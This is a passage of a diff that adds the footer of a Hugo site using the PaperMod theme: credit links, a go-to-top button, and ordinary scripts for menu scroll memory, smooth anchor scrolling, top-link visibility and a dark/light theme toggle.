+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
